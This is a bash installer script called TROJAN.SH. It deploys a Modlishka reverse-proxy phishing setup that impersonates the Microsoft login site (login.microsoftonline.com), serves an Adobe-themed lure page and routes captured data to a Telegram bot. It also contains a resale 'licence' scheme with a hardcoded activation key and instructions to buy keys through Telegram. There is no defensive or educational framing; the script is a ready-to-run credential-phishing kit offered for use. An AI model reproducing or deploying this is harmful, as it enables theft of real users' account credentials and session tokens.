#!/bin/bash
# 🏛️ TROJAN.SH - PRO LICENSE EDITION
# ------------------------------------------------
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

# 1. CLEANUP & INITIAL SETUP
tmux kill-server 2>/dev/null
sed -i '/byobu/d' ~/.bashrc

# 2. INTERACTIVE WIZARD (The info he provides once)
clear
echo -e "${BLUE}--- TROJAN.SH INSTALLATION WIZARD ---${NC}"
read -p "Enter your Domain (e.g., motarmo.click): " USER_DOMAIN
read -p "Enter Telegram Bot Token: " TG_TOKEN
read -p "Enter Telegram Chat ID: " TG_ID
read -p "Enter MongoDB User: " MONGO_USER
read -p "Enter MongoDB Pass: " MONGO_PASS

# 3. INSTALL SYSTEM CORE
echo -e "${GREEN}[+] Installing System Core...${NC}"
sudo apt update && sudo apt install -y golang-go git make screen php-cli unzip > /dev/null 2>&1

# 4. COMPILE ENGINE
cd /root
if [ ! -d "engine" ]; then
    git clone https://github.com/drk1wi/Modlishka.git engine
    cd engine && make && cd ..
fi

# 5. CREATE MASTER CONFIG (Automatic)
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "terminateUrl": "https://www.adobe.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb://$MONGO_USER:$MONGO_PASS@localhost:27017"
}
EOF

# 6. CREATE THE LICENSED RUN SCRIPT
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# CHECK LICENSE VALIDITY
if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${GREEN}[+] License Active. Trojan Engine is LIVE.${NC}"
        exit 0
    else
        echo -e "${RED}[!] 3-MONTH LICENSE EXPIRED. REACTIVATION REQUIRED.${NC}"
        rm "$LICENSE_FILE"
    fi
fi

# SHOW TROJAN PAGE IF NOT ACTIVATED
clear
echo -e "${BLUE}"
echo " ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗"
echo " ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║"
echo "    ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║"
echo "    ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║"
echo "    ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║"
echo "    ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝"
echo -e "${NC}"
echo -e "${RED}             [ SYSTEM UNAUTHORIZED ]${NC}"
echo " -------------------------------------------------------"
echo -e "${RED}[error] $(date +%H:%M:%S) received status 401 Unauthorized.${NC}"
echo -e "${RED}[error] Hardware ID: $HWID is not registered.${NC}"
echo -e "${BLUE}[important] Send HWID to @YourUsername on TG for 3-Month Key.${NC}"
echo " -------------------------------------------------------"

read -p "ENTER ACTIVATION KEY: " USER_KEY

# MASTER KEY FOR ACTIVATION
if [ "$USER_KEY" == "ACTIVATE-PRO-99" ]; then
    EXPIRY=$(($CURRENT_DATE + 7776000)) # 90 Days
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    echo -e "${GREEN}[success] Activated for 3 months! Run 'start' again.${NC}"
else
    echo -e "${RED}[error] Invalid Activation Key.${NC}"
    exit 1
fi
EOF
chmod +x /root/run.sh

# 7. SETUP GUI & ALIASES
mkdir -p /var/www/adobe_gui
# (Include your Adobe index.php code here)

echo "alias start='/root/run.sh'" >> ~/.bashrc
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc

echo -e "${GREEN}[+] DEPLOYED. Type 'source ~/.bashrc' then 'start'.${NC}"
